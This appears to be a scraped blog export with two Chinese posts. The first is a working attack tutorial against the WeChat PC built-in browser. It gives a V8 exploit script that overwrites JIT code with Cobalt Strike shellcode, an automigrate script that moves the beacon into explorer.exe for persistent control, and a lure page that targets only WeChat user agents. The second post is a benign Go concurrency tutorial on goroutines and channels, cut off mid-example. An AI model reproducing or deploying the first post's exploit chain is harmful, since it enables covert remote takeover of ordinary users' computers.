[{"content":"关于微信内置浏览器 达到持久控制 最近谷歌浏览器爆出了命令执行到处都是就不赘述了，由于微信调用了谷歌浏览器内核而且默认没开沙盒模式导致漏洞\n但是爆出来的利用是依赖在微信浏览器进程上的，对方点击恶意链接后可正常上线可是一旦关闭内置浏览器就会失去控制权\n解决上述问题 1.加载自定义 malleable C2配置文件 从而达到主机一上线跳默认为1秒，就可自动在目标打开浏览器短暂的时间里尽快转移进程\n2.加载一个 Cobalt Strike automigrate自动迁移进程的插件从而达到目标上线后会话自动迁移到其他进程从而我们就可以脱离微信浏览器的束缚\n具体操作 1.加载自定义 malleable C2配置文件 1 https://github.com/threatexpress/malleable-c2 在此项目上找到你cs版本对应的配置文件，我这里用的4.0 各版本差别不大 只需要修改心跳的设置为一秒 也可以用我改好的\n下载地址 ： jquery-c2.4.0.profile 修改好后丢到服务端 启动cobaltstrike时在最后面加上配置文件的名称就好 2.加载一个 Cobalt Strike automigrate自动迁移进程的插件 插件代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 on beacon_initial { sub callback { $regex = \u0026#39;(.*\\n)+explorer.exe\\t\\d+\\t(\\d+)(.*\\n)+\u0026#39;; $listener = \u0026#34;wx\u0026#34;; if ($2 ismatch $regex) { $pid = matched()[1]; $inject_pid = $pid; if (-is64 $1) { $arch = \u0026#34;x64\u0026#34;; } else { $arch = \u0026#34;x86\u0026#34;; } binject($1, $pid, $listener, $arch); } } if($inject_pid != beacon_info($1,\u0026#34;pid\u0026#34;)) { bps($1, \u0026amp;callback); } } 复制到本地保存成一个.cna文件使用cobaltstrike加载插件就可 测试： 1.准备文件 新建一个监听器 监听器名字一定要设置成wx，不然无法自动迁移进程\n生成一个shellcode 这里的就是你的shellcode，将所有\\替换成,0\n替换js代码里的shellcode exp.js代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 ENABLE_LOG = true; IN_WORKER = true; // run calc and hang in a loop var shellcode = [shellcode]; //\u0026#34;shellcode\u0026#34;处放我们的shellcode function print(data) {} var not_optimised_out = 0; var target_function = (function(value) { if (value == 0xdecaf0) { not_optimised_out += 1; } not_optimised_out += 1; not_optimised_out |= 0xff; not_optimised_out *= 12; } ); for (var i = 0; i \u0026lt; 0x10000; ++i) { target_function(i); } var g_array; var tDerivedNCount = 17 * 87481 - 8; var tDerivedNDepth = 19 * 19; function cb(flag) { if (flag == true) { return; } g_array = new Array(0); g_array[0] = 0x1dbabe * 2; return \u0026#39;c01db33f\u0026#39;; } function gc() { for (var i = 0; i \u0026lt; 0x10000; ++i) { new String(); } } function oobAccess() { var this_ = this; this.buffer = null; this.buffer_view = null; this.page_buffer = null; this.page_view = null; this.prevent_opt = []; var kSlotOffset = 0x1f; var kBackingStoreOffset = 0xf; class LeakArrayBuffer extends ArrayBuffer { constructor() { super(0x1000); this.slot = this; } } this.page_buffer = new LeakArrayBuffer(); this.page_view = new DataView(this.page_buffer); new RegExp({ toString: function() { return \u0026#39;a\u0026#39; } }); cb(true); class DerivedBase extends RegExp { constructor() { // var array = null; super(// at this point, the 4-byte allocation for the JSRegExp `this` object // has just happened. { toString: cb }, \u0026#39;g\u0026#39;// now the runtime JSRegExp constructor is called, corrupting the // JSArray. ); // this allocation will now directly follow the FixedArray allocation // made for `this.data`, which is where `array.elements` points to. this_.buffer = new ArrayBuffer(0x80); g_array[8] = this_.page_buffer; } } // try{ var derived_n = eval(`(function derived_n(i) { if (i == 0) { return DerivedBase; } class DerivedN extends derived_n(i-1) { constructor() { super(); return; ${\u0026#34;this.a=0;\u0026#34;.repeat(tDerivedNCount)} } } return DerivedN; })`); gc(); new (derived_n(tDerivedNDepth))(); this.buffer_view = new DataView(this.buffer); this.leakPtr = function(obj) { this.page_buffer.slot = obj; return this.buffer_view.getUint32(kSlotOffset, true, ...this.prevent_opt); } this.setPtr = function(addr) { this.buffer_view.setUint32(kBackingStoreOffset, addr, true, ...this.prevent_opt); } this.read32 = function(addr) { this.setPtr(addr); return this.page_view.getUint32(0, true, ...this.prevent_opt); } this.write32 = function(addr, value) { this.setPtr(addr); this.page_view.setUint32(0, value, true, ...this.prevent_opt); } this.write8 = function(addr, value) { this.setPtr(addr); this.page_view.setUint8(0, value, ...this.prevent_opt); } this.setBytes = function(addr, content) { for (var i = 0; i \u0026lt; content.length; i++) { this.write8(addr + i, content[i]); } } return this; } function trigger() { var oob = oobAccess(); var func_ptr = oob.leakPtr(target_function); print(\u0026#39;[*] target_function at 0x\u0026#39; + func_ptr.toString(16)); var kCodeInsOffset = 0x1b; var code_addr = oob.read32(func_ptr + kCodeInsOffset); print(\u0026#39;[*] code_addr at 0x\u0026#39; + code_addr.toString(16)); oob.setBytes(code_addr, shellcode); target_function(0); } try { print(\u0026#34;start running\u0026#34;); trigger(); } catch (e) { print(e); } 将上面生成的shellcode 替换到此处 创建一个html文件调用js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;正在加载网页\u0026lt;/title\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; // 对浏览器的UserAgent进行正则匹配，不含有微信独有标识的则为其他浏览器 var useragent = navigator.userAgent; if (useragent.match(/WindowsWechat/i) != \u0026#39;WindowsWechat\u0026#39;) { // 这里警告框会阻塞当前页面继续加载 alert(\u0026#39;已禁止本次访问：您必须使用PC端微信内置浏览器访问本页面！\u0026#39;); // 以下代码是用javascript强行关闭当前页面 var opened = window.open(\u0026#39;about:blank\u0026#39;, \u0026#39;_self\u0026#39;); opened.opener = null; opened.close(); } \u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;exp.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;div style=\u0026#34;font-size: 1.3em;margin: 10px auto;width: 200px;display: block;\u0026#34;\u0026gt; 正在加载网页中... \u0026lt;/div\u0026gt; \u0026lt;/head\u0026gt; 2.搭建服务 随便拿什么搭都可以 我直接用phpstudy搭建下 测试上线与进程转移效果 可以看的会上线两个 beacon 基于微信的会话在浏览器关闭后即掉线 而转移到explorer.exe的会话依然坚挺！ ","date":"2021-04-20T12:44:33Z","image":"https://w.wallhaven.cc/full/jx/wallhaven-jxd3xw.jpg","permalink":"https://360rce.github.io/p/whp5em3l/","title":"关于微信内置浏览器 达到持久控制"},{"content":"一、并发编程概述 1.1 并行和并发 1.1.1 并行 parallel 在同一时刻，有多条指令在多个处理器上同时执行。\n1.1.1.1 并行的两大特性 1.多进程、多核心。 2.物理上同时发生的过程。\n1.1.1.2 并行的简要示例图 并行需要硬件的支持，有块 128 核的 CPU 就能同时处理 128 个任务。\n1.1.2 并发 concurrency 并发是时间片轮转。在同一时刻只能有一条指令执行，但多个进程指令被快速地轮换执行，使得在宏观上具有多个进程同时执行的效果。但在微观上并不是同时执行，只是把时间分成若干段，使多个任务快速交替地执行。\n1.1.2.1 并发的两大特性 1.单进程。 2.逻辑上同时发生的过程。\n1.1.2.2 时间片轮转 举例解释：一个 CPU 给一个任务分配 1 秒的时间处理任务，1 秒后不再处理此任务而去处理另一个任务，由此轮转着进行。也就是，一个 CPU 处理任务的时间，根据这个时间，间隔交替执行多个任务。 CPU 处理任务的效率极高，通常是几毫秒内（甚至只是几纳秒）就能处理完一个任务，几毫秒的时间切换，人的肉眼是看不出交替的过程，也就是看起来感觉像是并行的。 并发是技术层面的工作：在有限的资源内，高效地利用 CPU 资源。\n1.1.2.3 并发的简要示例图 1.2 使用咖啡机理解并行与并发 拿现实生活中咖啡机的例子，初步理解并行与并发。\n1.2.1 并行演示 有两台咖啡机，两个队列同时使用两台咖啡机。 1.2.2 并发演示 两个队列交替使用同一台咖啡机。 只有一台咖啡机，一个队列的一个人拿完咖啡，另一个队列的另一个人拿咖啡。交替着进行！ 1.3 Go 语言的并发机制 所谓并发，就是交替着执行多个几个任务。 Golang 为并发编程而内置的上层 API 基于 CSP （Communicating Sequential Processes, 顺序通信进程）模型，显示锁是可以避免的。 Golang 使用了 goroutine （微线程，也可以称呼为：Go协程）来实现并发机制。 Golang 通过安全的通道发送和接收数据以实现同步。\n二、goroutine 和传统基于 OS 进程和线程不同，Go 语言的并发是基于用户态的并发，使用 goroutine 协程模型。 goroutine 其实是 协程 —— Go 协程，Go 语言的运行时（也就是 runtime）会参与调度 goroutine，并将 goroutine 合理地分配到每个 CPU 中，最大限度地使用 CPU 的性能。 可以把一个 goroutine 当做一个任务，一个 goroutine 就是一个新的任务。 协程比线程更小，十几个 goroutine 可能体现在底层就是 5、6 个线程，执行 goroutine 只需极少的栈内存(4 ~ 5 KB)，并根据实际数据进行伸缩。\n2.1 创建goroutine 只需要在函数调用语句前添加 go 关键字，就可以创建并发执行单元，调度器会自动将其安排到合适的系统线程上执行。 通过 go 关键字创建的 goroutine，可以称为子协程、工作协程。 可以把 func main() {} 理解成主协程，main() 主函数是一个 main goroutine。\n2.1.1 最基本的示例 新建一个 go 协程（新建一个新任务）。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 import ( \u0026#34;fmt\u0026#34; \u0026#34;time\u0026#34; ) func newTask() { for { fmt.Println(\u0026#34;this is newTask\u0026#34;) time.Sleep(time.Second) } } func main() { // 不能放到 for 语句块的下面，不然程序就一直在执行 for 死循环，永远不会去开启 go 协程。 // 新建一个 go 协程，新建一个任务。这个是新建的任务，原来的任务就是这个主函数：main 主协程 // 任务创建完毕后，程序继续往下走。 go newTask() for { fmt.Println(\u0026#34;this is main\u0026#34;) time.Sleep(time.Second) } } /* 运行结果： this is main this is newTask this is newTask this is main this is main this is newTask this is newTask this is main ... */ 打印顺序不可控是因为任务调度的原因造成： 遇到 go 关键字，系统就会新建一个 go 协程。子协程是一个新任务，主函数本身就是一个任务。两个任务交替着执行，就看谁先被调度器调度。两个任务轮转着执行。\n2.2 主协程退出，子协程也一起退出 主协程退出，子协程也一起退出。也可以称：主协程结束，子协程跟着一起结束。 main() 函数是主协程；其他由 go 关键字创建的协程叫子协程。\n2.2.1 示例1：主协程结束，子协程跟着一起结束 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 import ( \u0026#34;fmt\u0026#34; \u0026#34;time\u0026#34; ) func main() { // 新建一个新任务 go func() { i := 0 for { i++ fmt.Println(\u0026#34;sub-goroutine, i=\u0026#34;, i) time.Sleep(time.Second) } }() // 匿名函数别忘了加圆括号()调用 // 主任务 i := 0 for { i++ fmt.Println(\u0026#34;this is main, i=\u0026#34;, i) time.Sleep(time.Second) // 2 秒后退出这个 for 循环 if i == 2 { break } } } /* 运行结果： this is main, i= 1 sub-goroutine, i= 1 this is main, i= 2 sub-goroutine, i= 2 sub-goroutine, i= 3 */ 2 秒后，主协程内的 for 循环退出，接下来也没有其他代码，主协程（main() 函数）就结束了。此时，虽然子协程是一个死循环，但主协程已经结束了，那么子协程也跟着结束。\n2.2.2 示例2：主协程先退出，导致子协程没来得及调用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import ( \u0026#34;fmt\u0026#34; \u0026#34;time\u0026#34; ) func main() { // 新建一个新任务 go func() { i := 0 for { i++ fmt.Println(\u0026#34;sub-goroutine, i=\u0026#34;, i) time.Sleep(time.Second) } }() } 运行结果什么都没有的原因： 程序从 main() 函数入口处进入，main() 函数就是一个主协程。看到 go 关键字，就会去新建一个新的子协程。新建完后程序就会往下走，发现没有代码了，走到了主协程（main() 函数）的结束处，那么主协程（main() 函数）就结束了。main() 结束，整个程序结束，子协程只是被创建了但还没来得及运行，整个程序就已经结束了。整个程序结束了，子协程也就不复存在了！就相当于：想玩电脑游戏，刚启动游戏，游戏画面都还没有出来，跳闸断电关机了，游戏还能继续在电脑上运行吗？\n2.3 runtime 包 2.3.1 runtime.Gosched runtime.Gosched()，让出时间片。用于让出 CPU 时间片（让出当前 goroutine 的执行权限），调度器安排其他等待的任务运行，并在下次某个时候从该位置恢复执行。 简而言之：遇到 runtime.Gosched() 这行代码，让其他协程先执行完，然后再回到原来的调用者协程中，继续往下执行。 示例1：先看一个反面例子，程序执行完就结束，子协程没来得及执行就已经退出了：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 func main() { go func() { for i := 0; i \u0026lt; 5; i++ { fmt.Println(\u0026#34;go, i=\u0026#34;, i) } }() for i := 0; i \u0026lt; 2; i++ { fmt.Println(\u0026#34;main, i=\u0026#34;, i) } } /* 运行结果： main, i= 0 main, i= 1 */ 注意：因为调度的原因，有时候是可以打印出子协程的内容，甚至偶尔能让子协程运行完成。这是因为底层调度器的关系，先调度了子协程那么就先运行子协程的代码，先调度主协程那么就运行主协程。主协程运行结束，系统资源要回收前那一瞬间，调度器又调度了子协程，所以能运行子协程，但是当调度器再次回到主协程时，主协程因为之前已执行完毕，所以退出了。主协程退出，整个程序结束，子协程跟着结束。 接下来使用 runtime.Gosched()，让其他的协程先运行完：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 import ( \u0026#34;fmt\u0026#34; \u0026#34;runtime\u0026#34; ) func main() { go func() { for i := 0; i \u0026lt; 5; i++ { fmt.Println(\u0026#34;go, i=\u0026#34;, i) } }() for i := 0; i \u0026lt; 2; i++ { runtime.Gosched() // 让出时间片，让其他协程先执行完，然后再回来执行此协程 fmt.Println(\u0026#34;main, i=\u0026#34;, i) } } /* 运行结果： go, i= 0 go, i= 1 go, i= 2 go, i= 3 go, i= 4 main, i= 0 main, i= 1 */ 此时，就不会发生示例 1 中的情况。这里，遇到 runtime.Gosched() 就先不执行主协程，让子协程先执行，子协程执行完了，回来后，再继续执行主协程。\n2.3.2 runtime.Goexit runtime.Goexit()，立即终止当前 goroutine 执行。调度器确保所有已注册 defer 延迟调用被执行。 示例1：普通写法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 func test() { defer fmt.Println(\u0026#34;test cccccccc\u0026#34;) fmt.Println(\u0026#34;dddddd\u0026#34;) } func main() { go func() { fmt.Println(\u0026#34;aaaaa\u0026#34;) test() fmt.Println(\u0026#34;bbbbb\u0026#34;) }() //死循环的目的是为了不让主协程结束 for { } } /* 运行结果： aaaaa dddddd test cccccccc bbbbb */ 程序正常执行，开启一个子协程，第一步打印出\u0026quot;a…\u0026quot;，调用函数test，第二步打印\u0026quot;d…\u0026quot;，test函数结束前执行第三步打印\u0026quot;test c…\u0026quot;，最后打印\u0026quot;b…\u0026quot; 示例2：return 终止函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 func test() { defer fmt.Println(\u0026#34;test cccccccc\u0026#34;) return //终止函数 fmt.Println(\u0026#34;dddddd\u0026#34;) } func main() { go func() { fmt.Println(\u0026#34;aaaaa\u0026#34;) test() fmt.Println(\u0026#34;bbbbb\u0026#34;) }() //死循环的目的是为了不让主协程结束 for { } } /* 运行结果： aaaaa test cccccccc bbbbb */ test() 函数中，return 会终止这个test函数，所以\u0026quot;d…\u0026ldquo;不会打印出来。 示例3：runtime.Goexit 退出当前整个协程\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 import ( \u0026#34;fmt\u0026#34; \u0026#34;runtime\u0026#34; ) func test() { defer fmt.Println(\u0026#34;test cccccccc\u0026#34;) runtime.Goexit()\t//终止当前整个协程 fmt.Println(\u0026#34;dddddd\u0026#34;) } func main() { go func() { fmt.Println(\u0026#34;aaaaa\u0026#34;) test() fmt.Println(\u0026#34;bbbbb\u0026#34;)\t//因为被终止，所以不执行 }() // 死循环的目的是为了不让主协程结束 for { } } /* 运行结果： aaaaa test cccccccc */ return 和 runtime.Goexit() 的区别：return 只是终止当前这个函数；runtime.Goexit() 终止的是当前整个协程。 示例4：runtime.Goexit() 终止当前整个协程，它不会追溯到其他的协程\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 import ( \u0026#34;fmt\u0026#34; \u0026#34;runtime\u0026#34; ) //由gor1()协程中的代码调用 func test() { defer fmt.Println(\u0026#34;test ccc\u0026#34;) runtime.Goexit() //终止gor1()整个协程 fmt.Println(\u0026#34;test ddd\u0026#34;) } func gor1() { i := 0 for { i++ fmt.Println(\u0026#34;gor1..., i=\u0026#34;, i) if i == 2 { test() } } fmt.Println(\u0026#34;gor1..., finished.\u0026#34;) } func main() { //新建一个子协程 go func() { fmt.Println(\u0026#34;aaa\u0026#34;) //又新建一个子协程 go gor1() //新建后代码往下走，并不会立即调度执行这个协程里的代码 fmt.Println(\u0026#34;bbb\u0026#34;) }() //死循环的目的是为了不让主协程结束 for { } } /* 运行结果： aaa bbb gor1..., i= 1 gor1..., i= 2 test ccc */ 新建的第一个协程是匿名函数的协程，当新建第二个协程的时候，它们就是两个独立的协程了。runtime.Goexit() 终止的是当前整个协程，而不会追溯到其他的协程。看起来，gor1() 这个协程是在匿名函数协程中的，被匿名函数包裹起来了，感觉上是 gor1() 终止了，匿名函数也会被终止。但是，它们是两个独立的协程。所以当gor1()这个协程结束的时候，只会结束当前gor1() 这个协程，不会追溯到匿名函数这个协程。\n2.3.3 runtime.GOMAXPROCS runtime.GOMAXPROCS(int) 设置可以并行计算的 CPU 核数的最大值，并返回之前有几个 CPU 参与运算。 就是：使用多少核来运行程序。设置多个 CPU，让时间片轮转速度更快一些，执行效率更高。 示例1：以单核 CPU 运算\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import ( \u0026#34;fmt\u0026#34; \u0026#34;runtime\u0026#34; ) func main() { cores := runtime.GOMAXPROCS(1) // 指定以单核 CPU 运算，返回之前有几个 CPU 参与运算 fmt.Println(\u0026#34;how many cores:\u0026#34;, cores) for { go fmt.Print(1) fmt.Print(0) } } 只有单核运算的情况下，时间片轮转是：这个任务运行一段时间，另一个任务运行一段时间，交替着运行任务。所以，能看到下图中，同一时间只会输出一个值，因为在那个时间中，只处理那一个任务： 示例2：多核 CPU 运算\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import ( \u0026#34;fmt\u0026#34; \u0026#34;runtime\u0026#34; ) func main() { cores := runtime.GOMAXPROCS(2) // 指定 2 个 CPU 运算，返回之前有几个 CPU 在参与运算 fmt.Println(\u0026#34;how many cores:\u0026#34;, cores) for { go fmt.Print(1) fmt.Print(0) } } 不会出现示例 1 中，一大坨 0、1 的情况。因为是两个 CPU 在同时处理任务。 三、多任务资源竞争的问题 场景模拟：两个人在用同一台打印机，打印内容。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 import ( \u0026#34;fmt\u0026#34; \u0026#34;time\u0026#34; ) // 模拟一个打印机，按字符串的顺序打印每个字符 // 这个打印机属于公共资源 func Printer(str string) { for _, c := range str { fmt.Printf(\u0026#34;%c\u0026#34;, c) //Print(c)打印的是每个字符的ASCII码值 time.Sleep(time.Second) } fmt.Println() } func person1() { Printer(\u0026#34;hello\u0026#34;) } func person2() { Printer(\u0026#34;world\u0026#34;) } func main() { // 新建 2 个子协程，模拟 2 个人同时使用打印机 go person1() go person2() // 为了不让主协程结束，特意放了一个死循环 for { } } /* 运行结果： hweolrllod */ 多任务时经常遇到的问题：资源竞争，抢着用同一个资源。 如下图所示，两个子协程同时在使用一个资源，person1() 打印了 “h”，person2() 打印了 “w”，person1() 又来打印了 “e”，person2() 又来打印了 “o” …… 两个协程抢着用同一个资源，所以最终结果就乱了。 解决方案：同步。一个执行完了再执行另外一个，互斥。互斥需要用到 channel。\n四、channel channel 主要解决资源竞争的问题，以及两个协程之间的数据交互。实现：同步和数据交互。 goroutine 运行在相同的地址空间，访问共享内存必须做好同步。goroutine 之间的数据交互需要用到 channel。 goroutine 奉行：通过通信来共享内存，而不是共享内存来通信。 channel 是 CSP 模型的具体实现，用于多个 goroutine 之间的通讯，其内部实现了同步，确保并发的安全。 channel 是引用类型，函数参数传递时，是引用传递(传址)。\n4.1 channel 类型概述 channel 是一个对应 make() 创建的底层数据结构的引用。 channel 属于引用传递(传址)，调用者和被调用者引用的是同一个 channel。 定义一个 channel 时，必须指定发送到 channel 的值的类型。\n4.2 channel 创建 4.2.1 基本语法 1.make(chan Type) 2.make(chan Type, capacity) 当 capacity=0 的时候，channel 是无缓冲、阻塞读写的。 当 capacity\u0026gt;0 的时候，channel 有缓冲、非阻塞的。\n4.2.2 channel 的操作符：\u0026lt;- channel 通过操作符 \u0026lt;- 来接收和发送数据。\n1 2 3 4 channel \u0026lt;- value // 发送 value 到 channel \u0026lt;-channel // 接收数据并将其丢弃 x := \u0026lt;-channel // 从 channel 中接收数据，并赋值给变量x x, ok := \u0026lt;-channel // 接收数据赋值给x，同时检查通道是否已关闭或是否为空 当 capacity=0 或不指定的时候，channel 接收和发送数据都是阻塞的（没数据之前，它就等着写入数据才往下走），除非另一端已经准备好。这样使得 goroutine 同步变得更加的简单，不需要显示的 ok。\n4.3 使用 channel 实现同步 同步：有先后顺序地执行，一个执行完再执行另外一个。通道没有数据就会阻塞！ 以解决第 3 部分打印机的问题为例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 import ( \u0026#34;fmt\u0026#34; \u0026#34;time\u0026#34; ) // 管道全局变量，方便调用 var ch = make(chan int) // 管道传递的数据类型根据实际需要来指明 // 模拟一个打印机，按字符串的顺序打印每个字符 // 这个打印机属于公共资源 func Printer(str string) { for _, c := range str { fmt.Printf(\u0026#34;%c\u0026#34;, c) // Print(c) 打印的是每个字符的 ASCII 码值 time.Sleep(time.Second / 2) } fmt.Println() } func person1() { Printer(\u0026#34;hello\u0026#34;) ch \u0026lt;- 1 // 给管道写数据，发送 } func person2() { \u0026lt;-ch // 从管道取数据，接收。如果管道没有数据就会阻塞 Printer(\u0026#34;world\u0026#34;) } func main() { // 新建2个子协程，模拟2个人同时使用打印机 go person1() go person2() // 为了不让主协程结束，特意放了一个死循环 for { } } /* 运行结果： hello world Process finished with exit code 2 */ 4.4 通过 channel 实现同步和数据交互 4.4.1 死锁错误演示1 程序走完了，但依然没有给管道写数据，管道中没有数据能够接收到，那么程序永远阻塞在那里不会往下走，引发了死锁错误。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 func main() { defer fmt.Println(\u0026#34;main-goroutine finished.\u0026#34;) // 创建一个channel ch := make(chan string) // 新建一个子协程，懒得写函数调用可以使用匿名函数 go func() { for i := 0; i \u0026lt; 2; i++ { fmt.Println(\u0026#34;sub-goroutine, i=\u0026#34;, i) } fmt.Println(\u0026#34;sub-goroutine finished.\u0026#34;) }() str := \u0026lt;-ch // 管道中取不到数据，就会永远卡在这里，造成死锁 fmt.Println(\u0026#34;main-goroutine, str=\u0026#34;, str) } /* 运行结果： sub-goroutine, i= 0 sub-goroutine, i= 1 sub-goroutine finished. fatal error: all goroutines are asleep - deadlock! goroutine 1 [chan receive]: main.main() F:/goProject/src/myTest/main.go:19 +0x112 Process finished with exit code 2 */ 4.4.2 死锁错误演示2 不论是有缓冲通道还是无缓冲通道，通道中任意一方永久性阻塞，就会引发死锁错误。 4.4.3 解决死锁错误的方案：给管道写入数据 往管道里写入数据，Golang 内部立马能够检测到。管道接收到了数据就不会阻塞了，就能往下走了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 func main() { defer fmt.Println(\u0026#34;main-goroutine finished.\u0026#34;) // 创建一个channel ch := make(chan string) // 新建一个子协程，懒得写函数调用可以使用匿名函数 go func() { defer fmt.Println(\u0026#34;sub-goroutine closed.\u0026#34;) for i := 0; i \u0026lt; 2; i++ { fmt.Println(\u0026#34;sub-goroutine, i=\u0026#34;, i) } ch \u0026lt;- \u0026#34;sub-goroutine has finished work.\u0026#34; // 给管道写入数据 }() str := \u0026lt;-ch // 能从管道中取到数据了 fmt.Println(\u0026#34;main-goroutine, str=\u0026#34;, str) } /* 运行结果： sub-goroutine, i= 0 sub-goroutine, i= 1 sub-goroutine closed. main-goroutine, str= sub-goroutine has finished work. main-goroutine finished. */ 4.5 无缓冲 channel 无缓冲的通道 unbuffered channel 是指在接收前没有能力保存任何值的通道。 无缓冲的通道要求发送 goroutine 和接收 goroutine 同时准备好，才能完成发送和接收操作。如果两个 goroutine 没有同时准备好，通道会导致先执行发送或接收操作的 goroutine 阻塞等待。这种交互行为就是同步的，任意一个操作都无法离开另一个操作，不能单独存在。 特点：\n两边都阻塞 管道中不能存东西 交互之前阻塞，交互过程中阻塞，交互完成了才往下走 4.5.1 创建无缓冲 channel 语法：make(chan Type)。不要写 capacity，或者 capacity=0。\n4.5.2 计算channel的函数 len(ch) 缓冲区剩余数据的数量。 cap(ch) 缓冲区大小。\n4.5.3 示例 之前的例子都是无缓冲的 channel。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 import ( \u0026#34;fmt\u0026#34; \u0026#34;time\u0026#34; ) func main() { // 定义一个无缓冲的channel ch := make(chan int) fmt.Printf(\u0026#34;len(ch)=%d, cap(ch)=%d\\n\u0026#34;, len(ch), cap(ch)) // 新建一个子协程 go func() { for i := 0; i \u0026lt; 3; i++ { fmt.Println(\u0026#34;sub-goroutine, i=\u0026#34;, i) ch \u0026lt;- i // 往管道中放入内容 } }() time.Sleep(time.Second * 2) for i := 0; i \u0026lt; 3; i++ { num := \u0026lt;-ch // 从管道中取内容，没有内容前会阻塞 fmt.Println(\u0026#34;main-goroutine, num=\u0026#34;, num) } } /* 运行结果： len(ch)=0, cap(ch)=0 sub-goroutine, i= 0 sub-goroutine, i= 1 main-goroutine, num= 0 main-goroutine, num= 1 sub-goroutine, i= 2 main-goroutine, num= 2 */ 4.5.4 通过 channel 共享 goroutine 的变量 多个 goroutine 之间的变量共享示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 import ( \u0026#34;fmt\u0026#34; \u0026#34;time\u0026#34; ) // 生产者模型 func Produce(name string, ch chan\u0026lt;- string) { for i := 0; ; i++ { ch \u0026lt;- fmt.Sprintf(\u0026#34;%s\u0026#39;s product code: %d\u0026#34;, name, time.Now().Unix()) time.Sleep(1 * time.Second) } } // 消费者模型 func Customer(name string, ch \u0026lt;-chan string) { for { fmt.Printf(\u0026#34;%s cost %s\\n\u0026#34;, name, \u0026lt;-ch) } } func main() { ch := make(chan string) // 两个子协程用来生产 go Produce(\u0026#34;Sally\u0026#34;, ch) go Produce(\u0026#34;Rita\u0026#34;, ch) // 启动消费者模型，避免主协程提前退出 Customer(\u0026#34;Barry\u0026#34;, ch) } /* 运行结果： Barry cost Rita\u0026#39;s product code: 1601643297 Barry cost Sally\u0026#39;s product code: 1601643297 Barry cost Sally\u0026#39;s product code: 1601643298 Barry cost Rita\u0026#39;s product code: 1601643298 Barry cost Rita\u0026#39;s product code: 1601643299 Barry cost Sally\u0026#39;s product code: 1601643299 Barry cost Sally\u0026#39;s product code: 1601643300 Barry cost Rita\u0026#39;s product code: 1601643300 Barry cost Sally\u0026#39;s product code: 1601643301 Barry cost Rita\u0026#39;s product code: 1601643301 ... */ 4.6 有缓冲的 channel 有缓冲的通道 buffered channel 是一种在被接收前能存储一个或多个值的通道。 给定了一个缓冲区容量的通道，这个通道就是异步的。只要缓冲区未满还可以用于发送数据，或者接收方还能接收到数据，那么通信就可以无阻塞地进行。 有缓冲的 channel 发生阻塞的两种情况： 1.缓冲区满了，放不下任务数据了，发送方就会阻塞，等待接收方去取出至少一个数据。 2.缓冲区里面还没有任何的数据，接收方没办法接收到数据，接收方阻塞等待发送方把数据放入管道。 4.6.1 创建有缓冲的 channel 语法：make(chan Type, capacity)，并且 capaciy\u0026gt;0 即可。\n4.6.2 示例 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 import ( \u0026#34;fmt\u0026#34; \u0026#34;time\u0026#34; ) func main() { // 定义一个有缓冲的 channel，里面能放 3 个东西 ch := make(chan int, 3) fmt.Printf(\u0026#34;len(ch)=%d, cap(ch)=%d\\n\u0026#34;, len(ch), cap(ch)) // 新建一个子协程 go func() { for i := 0; i \u0026lt; 3; i++ { 